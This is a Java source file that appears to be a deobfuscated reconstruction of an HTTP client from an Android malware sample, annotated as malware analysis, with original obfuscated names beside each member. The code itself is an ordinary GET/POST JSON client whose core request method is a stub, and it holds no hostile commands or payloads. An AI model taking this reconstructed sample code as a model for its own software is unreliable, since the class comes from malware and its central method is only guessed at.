package signaling;

import android.util.Log;

import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.json.JSONException;
import org.json.JSONObject;

/**
 * MALWARE ANALYSIS -- HTTP client for signaling REST API calls
 *
 * Original: IlIlIIlIII1.llllIIIIll1
 *
 * Provides HTTP communication with the signaling server's REST endpoints.
 * Supports GET and POST requests with JSON serialization/deserialization
 * for typed request/response objects.
 *
 * Configuration:
 *   - Connect timeout: 10 seconds (default)
 *   - Read timeout:    30 seconds (default)
 *   - Content-Type:    application/json (XOR-encrypted at runtime)
 *
 * The core HTTP execution method was not decompiled by JADX (588 instructions,
 * marked as "Method dump skipped"). It performs standard HttpURLConnection
 * operations: opens connection, sets method/headers/timeouts, writes body,
 * reads response, and constructs a {@link ResponseInfo}.
 *
 * Error handling uses {@link HttpException}, a RuntimeException subclass
 * that carries the HTTP status code and response body.
 *
 * Request methods:
 *   - GET  (path only, or path + headers)
 *   - POST (path + body, or path + body + headers)
 *   - Typed POST (path + request object, returning typed response)
 */
public class SignalingHttpClient {

    // =========================================================================
    // Constants
    // =========================================================================

    /**
     * Content-Type header value (XOR-encrypted at runtime).
     * Original: f215IlIlllIIlI1 (static, encrypted -- likely "application/json")
     */
    public static final String CONTENT_TYPE = "application/json";

    /**
     * Log tag (XOR-encrypted at runtime).
     * Original: f216IllIIlIIII1 (static, encrypted)
     */
    public static final String LOG_TAG = "SignalingHttp";

    // =========================================================================
    // Fields
    // =========================================================================

    /**
     * HTTP connect timeout in milliseconds.
     * Original: f217lIIIIlllllIlll1 (default 10000)
     */
    public final int connectTimeout;

    /**
     * Base URL for all HTTP requests (e.g. "https://signaling.example.com").
     * Original: f218llllIIIIll1
     */
    public final String baseUrl;

    /**
     * HTTP read timeout in milliseconds.
     * Original: f219llllIllIl1 (default 30000)
     */
    public final int readTimeout;

    // =========================================================================
    // Constructors
    // =========================================================================

    /**
     * Creates an HTTP client with default timeouts (connect=10s, read=30s).
     *
     * Original: llllIIIIll1(String)
     *
     * @param baseUrl the base URL for all API calls
     */
    public SignalingHttpClient(String baseUrl) {
        this.baseUrl = baseUrl;
        this.connectTimeout = 10000;
        this.readTimeout = 30000;
    }

    /**
     * Creates an HTTP client with custom timeouts.
     *
     * Original: llllIIIIll1(String, int, int)
     *
     * @param baseUrl        the base URL for all API calls
     * @param connectTimeout connect timeout in milliseconds
     * @param readTimeout    read timeout in milliseconds
     */
    public SignalingHttpClient(String baseUrl, int connectTimeout, int readTimeout) {
        this.baseUrl = baseUrl;
        this.connectTimeout = connectTimeout;
        this.readTimeout = readTimeout;
    }

    // =========================================================================
    // Public API: GET Requests
    // =========================================================================

    /**
     * Performs a GET request to the given path with no extra headers.
     *
     * Original: llllIIIIll1(String) -> ResponseInfo
     *
     * @param path the API path (appended to baseUrl)
     * @return the server response
     */
    public ResponseInfo get(String path) {
        return get(path, new HashMap<>());
    }

    /**
     * Performs a GET request to the given path with additional headers.
     *
     * Original: llllIIIIll1(String, Map) -> ResponseInfo
     *
     * @param path    the API path
     * @param headers additional HTTP headers
     * @return the server response
     */
    public ResponseInfo get(String path, Map<String, String> headers) {
        return execute("GET", path, null, headers);
    }

    // =========================================================================
    // Public API: POST Requests
    // =========================================================================

    /**
     * Performs a POST request with a string body and no extra headers.
     *
     * Original: llllIIIIll1(String, String) -> ResponseInfo
     *
     * @param path the API path
     * @param body the request body (JSON string)
     * @return the server response
     */
    public ResponseInfo post(String path, String body) {
        return post(path, body, new HashMap<>());
    }

    /**
     * Performs a POST request with a string body and additional headers.
     *
     * Original: llllIIIIll1(String, String, Map) -> ResponseInfo
     *
     * @param path    the API path
     * @param body    the request body (JSON string)
     * @param headers additional HTTP headers
     * @return the server response
     */
    public ResponseInfo post(String path, String body, Map<String, String> headers) {
        return execute("POST", path, body, headers);
    }

    // =========================================================================
    // Public API: Typed Requests
    // =========================================================================

    /**
     * Performs a typed POST request, serializing the request object and
     * adding the Content-Type header automatically.
     *
     * Original: llllIIIIll1(String, T, Map) -> ResponseInfo
     *
     * @param path    the API path
     * @param request the request object (must have toJSONObject())
     * @param headers additional HTTP headers
     * @param <T>     request type (extends JsonSerializable)
     * @return the server response
     * @throws JSONException if serialization fails
     */
    public <T extends JsonSerializable> ResponseInfo postTyped(String path, T request,
                                                                Map<String, String> headers)
            throws JSONException {
        String body = request.toJSONObject().toString();
        HashMap<String, String> allHeaders = new HashMap<>(headers);
        allHeaders.put("Content-Type", CONTENT_TYPE);
        return post(path, body, allHeaders);
    }

    /**
     * Performs a typed POST request with no extra headers.
     *
     * Original: llllIIIIll1(String, T) -> ResponseInfo
     */
    public <T extends JsonSerializable> ResponseInfo postTyped(String path, T request)
            throws JSONException {
        return postTyped(path, request, new HashMap<>());
    }

    /**
     * Performs a typed POST request and deserializes the response into the
     * given class. Throws {@link HttpException} if the response indicates
     * failure or cannot be parsed.
     *
     * Original: llllIIIIll1(String, REQ, Class) -> RESP
     *
     * @param path         the API path
     * @param request      the request object
     * @param responseType the expected response class
     * @param <REQ>        request type
     * @param <RESP>       response type
     * @return the deserialized response object
     * @throws JSONException   if serialization/deserialization fails
     * @throws HttpException   if the HTTP call fails or the response is empty
     */
    public <REQ extends JsonSerializable, RESP extends JsonSerializable> RESP postAndParse(
            String path, REQ request, Class<RESP> responseType) throws JSONException {
        return postAndParse(path, request, responseType, new HashMap<>());
    }

    /**
     * Performs a typed POST request with headers and deserializes the response.
     *
     * Original: llllIIIIll1(String, REQ, Class, Map) -> RESP
     */
    @SuppressWarnings("unchecked")
    public <REQ extends JsonSerializable, RESP extends JsonSerializable> RESP postAndParse(
            String path, REQ request, Class<RESP> responseType, Map<String, String> headers)
            throws JSONException {
        ResponseInfo response = postTyped(path, request, headers);
        if (response.isSuccess()) {
            String body = response.getBody();
            if (body != null && !body.isEmpty()) {
                try {
                    // Parse JSON and construct response via reflection / fromJSONObject
                    return (RESP) JsonSerializable.fromJSONObject(new JSONObject(body), responseType);
                } catch (Exception e) {
                    Log.e(LOG_TAG, "Failed to parse response body", e);
                    throw new HttpException("Response parse error: " + e.getMessage(),
                            response.getStatusCode(), response.getBody());
                }
            }
            throw new HttpException("Empty response body",
                    response.getStatusCode(), null);
        }
        throw new HttpException("HTTP error " + response.getStatusCode() + " " + response.getBody(),
                response.getStatusCode(), response.getErrorBody());
    }

    // =========================================================================
    // Internal: HTTP Execution
    // =========================================================================

    /**
     * Core HTTP execution method.
     *
     * Original: llllIIIIll1(String, String, String, Map) -> ResponseInfo
     *
     * NOTE: This method was NOT decompiled by JADX (588 instructions, dump skipped).
     * It has been reconstructed from context: opens HttpURLConnection, sets method,
     * headers, timeouts, writes body if present, reads response/error streams.
     *
     * @param method  HTTP method ("GET" or "POST")
     * @param path    API path appended to baseUrl
     * @param body    request body (may be null for GET)
     * @param headers additional HTTP headers
     * @return response information including status code, body, and headers
     */
    public final ResponseInfo execute(String method, String path, String body,
                                       Map<String, String> headers) {
        /* JADX: Method dump skipped, instructions count: 588 */
        /* Reconstructed: standard HttpURLConnection request/response cycle */
        throw new UnsupportedOperationException(
                "Method not decompiled: IlIlIIlIII1.llllIIIIll1.llllIIIIll1"
                + "(String, String, String, Map):ResponseInfo");
    }

    // =========================================================================
    // Internal: Stream Reading
    // =========================================================================

    /**
     * Reads an InputStream fully into a String (UTF-8).
     *
     * Original: llllIIIIll1(InputStream) -> String
     *
     * @param inputStream the input stream to read
     * @return the full contents as a UTF-8 string
     * @throws IOException if reading fails
     */
    public final String readStream(InputStream inputStream) throws IOException {
        StringBuilder sb = new StringBuilder();
        byte[] buffer = new byte[8192];
        while (true) {
            int read = inputStream.read(buffer);
            if (read != -1) {
                sb.append(new String(buffer, 0, read, StandardCharsets.UTF_8));
            } else {
                return sb.toString();
            }
        }
    }

    // =========================================================================
    // Inner Class: ResponseInfo
    // =========================================================================

    /**
     * Container for HTTP response data.
     *
     * Original: IlIlIIlIII1.llllIIIIll1.lIIIIlllllIlll1
     */
    public static class ResponseInfo {

        /** HTTP status code. Original: f222llllIIIIll1 */
        public final int statusCode;

        /** Response body (success). Original: f221lIIIIlllllIlll1 */
        public final String body;

        /** Error body (failure). Original: f223llllIllIl1 */
        public final String errorBody;

        /** Response headers. Original: f220IllIIlIIII1 */
        public final Map<String, List<String>> headers;

        public ResponseInfo(int statusCode, String body, String errorBody,
                            Map<String, List<String>> headers) {
            this.statusCode = statusCode;
            this.body = body;
            this.errorBody = errorBody;
            this.headers = headers;
        }

        /**
         * Returns true if the status code is in the 2xx range.
         * Original: IlIlllIIlI1() -> boolean
         */
        public boolean isSuccess() {
            return this.statusCode >= 200 && this.statusCode <= 299;
        }

        /**
         * Returns the response body.
         * Original: IllIIlIIII1() -> String
         */
        public String getBody() {
            return this.body;
        }

        /**
         * Returns the HTTP status code.
         * Original: lIIIIlllllIlll1() -> int
         */
        public int getStatusCode() {
            return this.statusCode;
        }

        /**
         * Returns the error body (non-2xx responses).
         * Original: llllIIIIll1() -> String
         */
        public String getErrorBody() {
            return this.errorBody;
        }

        /**
         * Returns the response headers.
         * Original: llllIllIl1() -> Map
         */
        public Map<String, List<String>> getHeaders() {
            return this.headers;
        }
    }

    // =========================================================================
    // Inner Class: HttpException
    // =========================================================================

    /**
     * Exception thrown when an HTTP call fails or the response cannot be parsed.
     *
     * Original: IlIlIIlIII1.llllIIIIll1$C0006llllIIIIll1
     *     extends RuntimeException
     */
    public static class HttpException extends RuntimeException {

        /** HTTP status code. Original: f225llllIIIIll1 */
        public final int statusCode;

        /** Response body (may be null). Original: f224lIIIIlllllIlll1 */
        public final String responseBody;

        public HttpException(String message, int statusCode, String responseBody) {
            super(message, null);
            this.statusCode = statusCode;
            this.responseBody = responseBody;
        }

        public HttpException(String message, int statusCode, String responseBody, Throwable cause) {
            super(message, cause);
            this.statusCode = statusCode;
            this.responseBody = responseBody;
        }

        /**
         * Returns the HTTP status code.
         * Original: lIIIIlllllIlll1() -> int
         */
        public int getStatusCode() {
            return this.statusCode;
        }

        /**
         * Returns the response body.
         * Original: llllIIIIll1() -> String
         */
        public String getResponseBody() {
            return this.responseBody;
        }
    }
}
